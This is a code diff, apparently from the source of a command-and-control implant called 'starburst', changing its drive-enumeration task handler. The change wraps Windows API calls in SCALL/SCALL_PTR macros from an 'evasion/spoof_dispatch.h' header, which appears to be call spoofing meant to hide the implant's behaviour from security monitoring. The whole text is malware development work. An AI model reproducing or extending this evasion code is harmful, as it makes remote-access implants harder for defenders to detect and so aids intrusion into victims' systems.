@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_DRIVES
 
@@ -36,7 +37,7 @@ auto declfn starburst::cmd_drives(
     }
 
     wchar_t drive_buf[512] = { 0 };
-    DWORD len = pGetLogicalDriveStringsW( 511, drive_buf );
+    DWORD len = (DWORD)SCALL_PTR( inst, pGetLogicalDriveStringsW, 511, drive_buf );
     if ( len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetLogicalDriveStringsW failed" ) ) );
@@ -59,13 +60,13 @@ auto declfn starburst::cmd_drives(
     while ( *p && off + 40 < out_cap ) {
         // convert drive letter to narrow
         char narrow[8] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, p, -1, narrow, 8, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, p, -1, narrow, 8, nullptr, nullptr );
         uint32_t nlen = str_len( narrow );
         memory::copy( output + off, narrow, nlen );
         off += nlen;
         output[off++] = '\t';
 
-        UINT dtype = pGetDriveTypeW( p );
+        UINT dtype = (UINT)SCALL_PTR( inst, pGetDriveTypeW, p );
         switch ( dtype ) {
             case 2:
                 str_copy( output + off, symbol<char*>( const_cast<char*>( "Removable" ) ) );
